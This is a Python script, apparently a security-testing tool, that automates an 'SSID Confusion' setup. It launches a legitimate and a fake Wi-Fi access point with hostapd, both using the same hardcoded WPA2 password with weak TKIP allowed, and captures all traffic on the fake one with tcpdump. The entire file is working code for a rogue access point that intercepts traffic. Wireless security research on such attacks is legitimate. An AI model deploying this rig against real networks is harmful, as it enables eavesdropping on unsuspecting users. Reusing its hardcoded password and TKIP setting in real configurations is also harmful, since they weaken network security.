import argparse
import os
import subprocess
import signal
import sys
import textwrap
import time # Explicitly import time

# Creates a hostapd configuration file.
def create_hostapd_config(ssid, iface, filename):
    password = "1234567890"  # Hardcoded default password
    config = textwrap.dedent(f"""\
        interface={iface}
        ssid={ssid}
        hw_mode=g
        channel=1
        wpa=2
        wpa_passphrase={password}
        wpa_key_mgmt=WPA-PSK
        wpa_pairwise=TKIP # Note: TKIP is weak.
        rsn_pairwise=CCMP
    """)
    with open(filename, 'w') as file:
        file.write(config)

# Starts a hostapd process.
def start_hostapd(config_file):
    # Run hostapd. Note: Stderr/Stdout are not captured by default.
    print(f"Attempting to start hostapd with config: {config_file}")
    return subprocess.Popen(['hostapd', config_file])

# Starts a tcpdump process.
def start_tcpdump(iface, output_file):
    print(f"Attempting to start tcpdump on interface: {iface} writing to {output_file}")
    # Start tcpdump capture
    return subprocess.Popen(['tcpdump', '-i', iface, '-w', output_file])

# Stops processes and removes configuration files.
def cleanup(config_files, processes):
    print("\nCleaning up...")
    # Terminate processes first (reverse order: tcpdump before hostapd)
    for process in reversed(processes):
        try:
            print(f"Terminating process {process.pid}...")
            process.terminate()
            process.wait(timeout=5) # Wait briefly for graceful termination
        except ProcessLookupError:
            print(f"Process {process.pid} already terminated.")
        except subprocess.TimeoutExpired:
            print(f"Process {process.pid} did not terminate gracefully, killing.")
            process.kill() # Force kill if termination fails
        except Exception as e:
            print(f"Error terminating process {process.pid}: {e}")

    # Delete configuration files
    for config_file in config_files:
        if os.path.exists(config_file):
            try:
                print(f"Removing config file: {config_file}")
                os.remove(config_file)
            except Exception as e:
                print(f"Error removing config file {config_file}: {e}")
    print("Cleanup finished.")
    sys.exit(0) # Exit cleanly after cleanup

# Handles termination signals (SIGINT, SIGTERM) to trigger cleanup.
def signal_handler(sig, frame):
    print(f"Signal {sig} received, initiating cleanup...")
    # Call cleanup using the globally defined lists
    cleanup(config_files, processes)

# Main execution function.
def main():
    parser = argparse.ArgumentParser(description="Automate SSID Confusion test with Hostapd and tcpdump")
    parser.add_argument("interface_legit", help="Network interface for legitimate SSID (e.g., wlan0)")
    parser.add_argument("interface_fake", help="Network interface for fake SSID (e.g., wlan1)")
    parser.add_argument("legit_ssid", help="Legitimate SSID")
    parser.add_argument("fake_ssid", help="Fake SSID")
    args = parser.parse_args()

    # Define lists globally for access by signal_handler via cleanup()
    global config_files, processes
    config_files = ['hostapd_legit.conf', 'hostapd_fake.conf']
    processes = []

    # Store original signal handlers to restore them in case of error during setup
    original_sigint = signal.getsignal(signal.SIGINT)
    original_sigterm = signal.getsignal(signal.SIGTERM)
    # Set custom signal handlers for graceful shutdown
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    try:
        # Create Hostapd configuration files
        print("Creating hostapd config files with WPA2 (hardcoded password)...")
        create_hostapd_config(args.legit_ssid, args.interface_legit, config_files[0])
        create_hostapd_config(args.fake_ssid, args.interface_fake, config_files[1])
        print("Config files created.")

        # Start Hostapd processes
        processes.append(start_hostapd(config_files[0]))
        processes.append(start_hostapd(config_files[1]))

        # Give hostapd a moment to bring up the interface before starting tcpdump
        print("Waiting briefly before starting tcpdump...")
        time.sleep(3)
        # Start tcpdump capture on the fake interface
        processes.append(start_tcpdump(args.interface_fake, 'tcpdump_output.pcap'))

        # Script operational message
        print("\nSetup complete. Hostapd and tcpdump should be running.")
        print(f"Broadcasting '{args.legit_ssid}' (WPA2) on {args.interface_legit} with password '1234567890'")
        print(f"Broadcasting '{args.fake_ssid}' (WPA2) on {args.interface_fake} with password '1234567890'")
        print(f"Capturing traffic on {args.interface_fake} to tcpdump_output.pcap")
        print("\nPress Ctrl+C to stop the script and clean up.")

        # Wait indefinitely for a signal (SIGINT/SIGTERM)
        signal.pause()

    except Exception as e:
        # Catch errors during setup
        print(f"\n--- An error occurred during setup: {e} ---")
        print("--- Initiating cleanup due to error ---")
        # Restore original handlers before cleanup to avoid potential recursion if cleanup itself errors
        signal.signal(signal.SIGINT, original_sigint)
        signal.signal(signal.SIGTERM, original_sigterm)
        cleanup(config_files, processes) # Attempt cleanup despite error
        sys.exit(1) # Exit with error status

if __name__ == "__main__":
    main()
